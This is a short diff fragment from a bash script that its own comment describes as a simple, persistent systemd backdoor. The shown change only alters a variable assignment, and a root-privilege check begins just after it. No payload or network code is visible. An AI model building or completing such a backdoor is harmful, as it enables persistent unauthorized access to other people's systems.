@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # My Backdoor with systemd very simple and persistent
 
-Ow0=clear
+Ow0=$(clear)
 
 if [ $(/usr/bin/whoami) = "root" ]; then
 
